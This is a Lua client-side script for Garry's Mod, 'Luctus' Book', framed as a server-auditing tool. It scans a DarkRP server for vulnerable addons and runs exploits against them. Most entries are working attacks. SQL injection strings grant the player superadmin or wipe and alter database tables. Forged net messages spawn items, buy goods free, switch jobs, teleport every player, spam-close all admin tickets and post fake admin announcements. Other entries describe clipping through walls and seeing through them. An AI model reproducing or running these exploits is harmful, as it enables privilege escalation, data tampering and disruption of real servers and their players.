--Luctus' Book
--Made with love by OverlordAkise

--Made to find problems with (darkrp) servers
--Don't you dare ruin servers with this
--Or I will cast ruinga on you

local book = book or {}
book.pages = book.pages or {}
book.recipes = book.recipes or {}
book.thinkFuncs = {}


concommand.Add("book", function( ply, cmd, args )
  if (args[1] == "open") then
    book.cook()
    print("recipes:  "..#book.recipes)
    print("pages:    "..#book.pages)
  elseif (args[1] == "read") then
    for k,v in pairs(book.pages) do
      print("["..k.."] "..v[1].."\t-\t"..v[2])
    end
  elseif (args[1] == "count") then
    print("recipes:  "..#book.recipes)
    print("pages:    "..#book.pages)
  elseif (args[1] == "all") then
    for k,v in pairs(book.recipes) do
      print(v[1].."\t-\t"..v[2])
    end
  elseif (args[1] == "cook") then
    book.pages[tonumber(args[2])][4]()
    print("Cooking")
  elseif (args[1] == "finish") then
    book.recipes[tonumber(args[2])][5]()
    print("Done")
  else
    print("unknown step")
  end
end)

local function addPage(name,desc,findFunc,startFunc,endFunc)
  table.insert(book.recipes, {name,desc,findFunc,startFunc,endFunc})
end

function book.cook()
  book.pages = {}
  for k,v in pairs(book.recipes) do
    if v[3]() then
      table.insert(book.pages,v)
    end
  end
end

addPage("Adds auto jump",
  "You gotta have fun right? Test if they stop you (WARNING FOR AC)",
  function()
    return true
  end,
  function()
    hook.Add("CreateMove","wjdksai",function(cmd)
      if bit.band( cmd:GetButtons(), IN_JUMP ) ~= 0 then
        if !LocalPlayer():IsOnGround() then
          cmd:SetButtons( bit.band( cmd:GetButtons(), bit.bnot( IN_JUMP ) ) )
        end
      end
    end)
  end,
  nil
)


addPage("Extreme Tickrate", 
  "Too high tickrate with more than 40",
  function()
    return (1 / engine.TickInterval()) > 40
  end,
  function()
    print("A high tickrate makes the server unstable!")
    print("This means easy crashes with ragdolls and props!")
    print("DarkRP should have (max) 33 ticks")
    print("Or, if laggy, 22 / 16 ticks")
  end,
  nil
)


addPage("Allowing CS in DarkRP", 
  "The Server allows the use of disallowCS",
  function()
    if DarkRP then
      return (GetConVar("sv_allowcslua"):GetInt() ~= 0 or GAMEMODE.Config.disallowClientsideScripts == false)
    else
      return GetConVar("sv_allowcslua"):GetInt() ~= 0
    end
  end,
  function()
    print("To use this: Execute files in your garrysmod/lua folder with the following command:")
    print("lua_openscript_cl myscript.lua")
  end,
  nil
)


addPage("SCP714 Ring Spawner", 
  "Server doesn't check if you wear the ring, you can drop infinite rings",
  function()
    return GetConVar("scp714_kill") ~= nil
  end,
  function()
    net.Start("Drop714")
    net.SendToServer()
  end,
  nil
)

addPage("SCP178 Spawner", 
  "Server doesn't check if you have SCP178, you can spawn infinite",
  function()
    return util.NetworkIDToString(util.NetworkStringToID("Drop178")) == "Drop178"
  end,
  function()
    net.Start("Drop178")
    net.SendToServer()
  end,
  nil
)


addPage("VJBase Spawn bug", 
  "Only works if you have a toolgun and run the console command 'gmod_toolmode vjstool_npcspawner'",
  function()
    return util.NetworkIDToString(util.NetworkStringToID( "vj_npcspawner_sv_create" )) == "vj_npcspawner_sv_create"
  end,
  function()
    net.Start("vj_npcspawner_sv_create")
      local t = {}
      t.vjstool_npcspawner_playsound = 0
      t.vjstool_npcspawner_nextspawntime = 1
      net.WriteTable(t)
      net.WriteVector(LocalPlayer():GetEyeTrace().HitPos+Vector(0,0,60))
      local tlines = {}
      table.insert(tlines,{Entities="npc_metropolice",SpawnPosition=Vector(0,0,0),WeaponsList="default",EntityName="Metro Police"})

      net.WriteType(tlines)
      net.WriteString("RightClick")
    net.SendToServer()
  end,
  nil
)


addPage("No FPS Boost", 
  "gmod_mcore_test is not 1",
  function()
    return GetConVar("gmod_mcore_test"):GetInt() == 0
  end,
  function()
    RunConsoleCommand("gmod_mcore_test", 1)
  end,
  nil
)


addPage("FreeBodygroupr bug", 
  "You can set your playermodel to any model you want (eg. a plane)",
  function()
    return util.NetworkIDToString(util.NetworkStringToID( "update_store_freebodygroupr" )) == "update_store_freebodygroupr"
  end,
  function()
    net.Start( "update_store_freebodygroupr" )
      net.WriteInt( -10, 32 )
      net.WriteInt( -10, 32 )
      net.WriteString( "models/xqm/jetbody3_s5.mdl" )
    net.SendToServer()
  end,
  nil
)


addPage("Defconsystem bug", 
  "Set the defcon text and level to anything you want as a user",
  function()
    return util.NetworkIDToString(util.NetworkStringToID( "DefconSys1" )) == "DefconSys1"
  end,
  function()
    local Defcon = {
      level = "Aqua is waifu",
      reason = "Aqua is waifu",
      author = "Aqua is waifu",
    }
    net.Start("DefconSys1")
    net.WriteTable(Defcon)
    net.SendToServer()
  end,
  nil
)


addPage("ulx votemap", 
  "You can use ulx votemap to change the map",
  function()
    if (ULib and ULib.ucl and ULib.ucl.query) then
      return ULib.ucl.query(LocalPlayer(),"ulx votemap")
    else
      return false
    end
  end,
  function()
    print("Simply do !menu and vote for a different map with 2 friends")
  end,
  nil
)

addPage("KShop bug", 
  "You can buy ANY item from anywhere on the map for free",
  function()
    if (KShop) then return true else return false end
  end,
  function()
    net.Start("KS_BuyItem")
      net.WriteTable({price=1,typ="weapon",item="weapon_crowbar"})
    net.SendToServer()
  end,
  nil
)


addPage("ceto_tickets sql injection", 
  "Become superadmin with fadmin for free!",
  function()
    return util.NetworkIDToString(util.NetworkStringToID( "TicketSystem:CreateAnswer" )) == "TicketSystem:CreateAnswer"
  end,
  function()
    print("To do this: Open a ticket and comment the following text into it as a comment:")
    print("Testing sa!', '93'); INSERT INTO FAdmin_PlayerGroup(steamid, groupname) VALUES('"..LocalPlayer():SteamID().."','superadmin');--")
  end,
  nil
)


addPage("charsys sql injection", 
  "Become superadmin with fadmin for free!",
  function()
    return util.NetworkIDToString(util.NetworkStringToID( "CharSystemCreateProfile" )) == "CharSystemCreateProfile"
  end,
  function()
    net.Start("CharSystemCreateProfile")
      net.WriteUInt(1, 8)
      net.WriteString("Peter Hustensaft'; INSERT INTO FAdmin_PlayerGroup(steamid, groupname) VALUES(\""..LocalPlayer():SteamID().."\",\"superadmin\");--")
      --net.WriteString("Peter Husten'; UPDATE charsys SET money = 999999999;--")
      --net.WriteString("Peter Husten'; DELETE FROM FPP_BLOCKEDMODELS1;--")
      --net.WriteString("Peter Husten'; DELETE FROM FPP_BLOCKED1;--")
    net.SendToServer()
  end,
  nil
)


addPage("gdeathsystem teleports", 
  "Teleport players with the defib! (Only works if you have it as your active weapon)",
  function()
    return util.NetworkIDToString(util.NetworkStringToID( "Medic.SendRagdollRequest" )) == "Medic.SendRagdollRequest"
  end,
  function()
    for k,v in pairs(player.GetAll()) do
    net.Start("Medic.SendRagdollRequest")
      net.WriteEntity(v)
      net.WriteVector(Vector(0,0,0))
    net.SendToServer()
    end
  end,
  nil
)


addPage("DarkRP jobs",
  "You could access darkrp jobs with their commands bypassing F4 restrictions",
  function()
    return DarkRP
  end,
  function()
    for k,v in pairs(RPExtraTeams) do
      print(v.name.." -> "..v.command)
    end
  end,
  nil
)


addPage("Propspawning still on",
  "The SpawnMenu is probably disabled, but according to the darkrp config you should still be able to spawn props",
  function()
    local spawning = DarkRP and GAMEMODE.Config.propspawning or false
    local spawnmenu = not hook.Call("SpawnMenuOpen",GAMEMODE)
    return (spawning and spawnmenu)
  end,
  function()
    print("Simply type 'gm_spawn <model>' in your console to spawn props without a spawnmenu")
  end,
  nil
)


addPage("Thirdperson bug",
  "You can use thirdperson for looking through walls",
  function()
    local cv = GetConVar("simple_thirdperson_enabled")
    return cv
  end,
  function()
    print("Hold C and turn on thirdperson, then go to the camera setting and disable camera collision")
    print("Now your thirdperson camera can look through walls and spot hidden enemies")
  end,
  nil
)


addPage("gdrive url bug",
  "32bit gmod (standard) doesn't support google drive websites (can't display them) (found in ulx_motdurl)",
  function()
    local cv = GetConVar("ulx_motdurl")
    return (cv and string.find(cv:GetString(),"google") ~= nil or false)
  end,
  function()
    print("Tell the server owner that he/she should not host their rules on a google drive document")
  end,
  nil
)


addPage("sleep door glitch",
  "You could push other people through doors because /sleep is still enabled",
  function()
    if not DarkRP then return false end
    local disDefault = DarkRP and (DarkRP.disabledDefaults["modules"]["sleep"] == false) or false
    local command = DarkRP.getChatCommands() and (DarkRP.getChatCommands()["sleep"] ~= nil) or false
    return (disDefault and command)
  end,
  function()
    print("Do /sleep near a door (but not too close) and let other people push/gravgun/punch you through the door")
  end,
  nil
)

--[[
--The ConVar is serverside only, so this is not working
addPage("sit anywhere invincibility",
  "Damage during sitting is not enabled, thus making you invincible if you sit",
  function()
    local cv = GetConVar("sitting_can_damage_players_sitting")
    return (cv and cv:GetInt() ~= 1 or false)
  end,
  function()
    print("Simply sit down and become invincible against any kind of damage")
  end,
  nil
)
--]]


addPage("sit anywhere + nocollide props",
  "Sit on a prop, nocollide it and move through doors",
  function()
    local collision = DarkRP and GAMEMODE.Config.allowedProperties.collision or false
    local sitanywhere = GetConVar("sitting_use_walk")
    return (collision and sitanywhere)
  end,
  function()
    print("Same as description")
  end,
  nil
)


addPage("/buy still works",
  "You can still buy pistols as a civilian (cook for list)",
  function()
    local enabled = DarkRP and GAMEMODE.Config.enablebuypistol or false
    local dealerOnly = DarkRP and (GAMEMODE.Config.restrictbuypistol == false) or false
    return (enabled and dealerOnly)
  end,
  function()
    print("Type in the chat '/buy xxx':")
    for k,v in pairs(CustomShipments) do
      if not v or not v.separate or not v.name then return end
      print(v.name)
    end
  end,
  nil
)


addPage("gProtect 2player boogaloo",
  "gProtect costs shit and is still worse than gm_apg lmao",
  function()
    return gProtect
  end,
  function()
    print("gProtect is worse than gm_apg. Recommend them gm_apg.")
    print("Possible Bugs: ")
    print("2 players can spawn props inside each others for server lagging")
    print("You can use /sleep or a tazer to ragdoll ontop of props and thus removing them")
    print("Cars could break if you lift them up")
  end,
  nil
)


addPage("DarkRP default DisallowDropList",
  "The DarkRP DisallowDrop list has only default elements, you could drop unwanted weapons",
  function()
    return DarkRP and (table.Count(GAMEMODE.Config.DisallowDrop) == 14) or false
  end,
  function()
    print("You could probably drop all police weapons and use them as a civilian")
  end,
  nil
)


addPage("DarkRP buyammo",
  "You could probably buy ammo with /buyammo (cook for list)",
  function()
    local ammoExists = table.Count(GAMEMODE.AmmoTypes) > 0
    local gunsEnabled = DarkRP and (GAMEMODE.Config.noguns == false) or false
    return (ammoExists and gunsEnabled)
  end,
  function()
    print("Simply type in chat '/buyammo pistol' and you should spawn ammo infront of you")
    PrintTable(GAMEMODE.AmmoTypes)
  end,
  nil
)


addPage("not enough textscreens",
  "Only 1 textscreen is not enough (for DarkRP)",
  function()
    local cv = GetConVar("sbox_maxtextscreens")
    return (cv and cv:GetInt() < 1 or false)
  end,
  function()
    print("Not enough textscreens for users to use (probably)")
  end,
  nil
)


addPage("employers job changer", 
  "Become every job you want via an Employers addon NPC",
  function()
    return util.NetworkIDToString(util.NetworkStringToID( "em_become" )) == "em_become"
  end,
  function()
    net.Start("em_become")
      net.WriteUInt(3,8)
    net.SendToServer()
  end,
  nil
)

addPage("free bodygroupr exploit", 
  "Set yourself any model you want",
  function()
    return util.NetworkIDToString(util.NetworkStringToID( "update_store_freebodygroupr" )) == "update_store_freebodygroupr"
  end,
  function()
    net.Start( "update_store_freebodygroupr" )
      net.WriteInt( -10, 32 )
      net.WriteInt( -10, 32 )
      net.WriteString( "models/player/eli.mdl" )
    net.SendToServer()
  end,
  nil
)

--[[
--This one didn't work correctly!
--It calculates your own addons + the server addons
addPage("download size too big",
  "The download size when joining the server is too much (>4GB)!",
  function()
    local en = engine.GetAddons()
    table.sort( en, function(a, b) return a["size"] > b["size"] end )
    local together = 0
    for k,v in pairs(en) do
      together = together + v["size"]
    end
    return together > 4000000000
  end,
  function()
    
    local en = engine.GetAddons()
    table.sort( en, function(a, b) return a["size"] > b["size"] end )
    local together = 0
    for k,v in pairs(en) do
      print(v["title"] .. " -> " .. string.NiceSize(v["size"]))
      together = together + v["size"]
    end
    print("---")
    print("The current download size for new players is too big!")
    print("Downloadsize: "..string.NiceSize(together))
    print("Above are all the addons, sorted by filesize decreasing.")
  end,
  nil
)
--]]


--New for v2.1 (2022.06.19)

addPage("set defon level", 
  "They don't check who is changing the defcon, or what you change it to",
  function()
    return DataPads and DataPads.SendRequest
  end,
  function()
    Datapads:SendRequest(1,"changeagenda","sadness")
    Datapads:SendRequest(1,"changedefcon",1)
  end,
  nil
)

addPage("ulx notepad", 
  "You can read the ulx notepad as a user",
  function()
    return util.NetworkIDToString(util.NetworkStringToID( "GetContents" )) == "GetContents"
  end,
  function()
    MenuOpen()
    net.Start( "GetContents" )
      net.WriteFloat( 1 )
    net.SendToServer()
  end,
  nil
)

addPage("adminpopups close all tickets", 
  "You can close any ticket, effectively disabling the addon by spamming 'close' for all players",
  function()
    return util.NetworkIDToString(util.NetworkStringToID( "ASayPopupClaim" )) == "ASayPopupClaim"
  end,
  function()
    timer.Create("remove_error_models", 0.5, 0, function()
        for k,v in pairs(player.GetAll()) do
            net.Start("ASayPopupClaim")
                net.WriteEntity(v)
            net.SendToServer()
        end
    end)
  end,
  function()
    timer.Remove("remove_error_models")
    print("Timer removed!")
  end
)

addPage("sitanywhere bug through walls", 
  "If sitanywhere is installed via workshop: You can bug yourself through walls and windows",
  function()
    return util.NetworkIDToString(util.NetworkStringToID( "SitAnywhere" )) == "SitAnywhere"
  end,
  function()
    print("How-To: Simply sit down on a window bench, have another player stand crouching inside you")
    print("And then stand up, if done correctly you will be teleported through the wall")
  end,
  nil
)

addPage("create admin announcements", 
  "The adminannouncement (or 'Server Announcement System') addon doesnt verify who sends an announcement, which means we can create one as a user.",
  function()
    return util.NetworkIDToString(util.NetworkStringToID( "announcementadmin" )) == "announcementadmin"
  end,
  function()
    net.Start("announcementadmin")
        net.WriteString("!THIS IS A TEST ANNOUNCEMENT!")
        net.WriteString("10")
    net.SendToServer()
  end,
  nil
)

addPage("summe nextbots entity spawner", 
  "SummeNextbots allows any user to spawn any entity from a net message created entity spawner. (Spawns at eyepos)",
  function()
    return util.NetworkIDToString(util.NetworkStringToID( "SummeNextbots.SpawnDispenser" )) == "SummeNextbots.SpawnDispenser"
  end,
  function()
    net.Start("SummeNextbots.SpawnDispenser")
        net.WriteVector(LocalPlayer():GetEyeTrace().HitPos+Vector(0,0,20))
        net.WriteTable({["manhack_welder"] = 1, ["weapon_smg1"] = 1})
        net.WriteString("models/Kleiner.mdl")
        net.WriteUInt(100,15)
        net.WriteBool(false)
    net.SendToServer()
  end,
  nil
)

--[[
--TODO: symfphys spammable?
net.Receive("simfphys_request_ppdata" ... local ent = net.ReadEntity()
--TODO: Maybe spawn symfphys with concommand? Couldnt test yet
concommand.Add( "simfphys_spawnvehicle", function( ply, cmd, args ) SpawnSimfphysVehicle( ply, args[1] ) end )
	local VehicleList = list.Get( "simfphys_vehicles" )
	local vehicle = VehicleList[ vname ]
--]]

print("+------+")
print("|luctus|")
print("| book |")
print("| v2.1 |")
print("+------+")
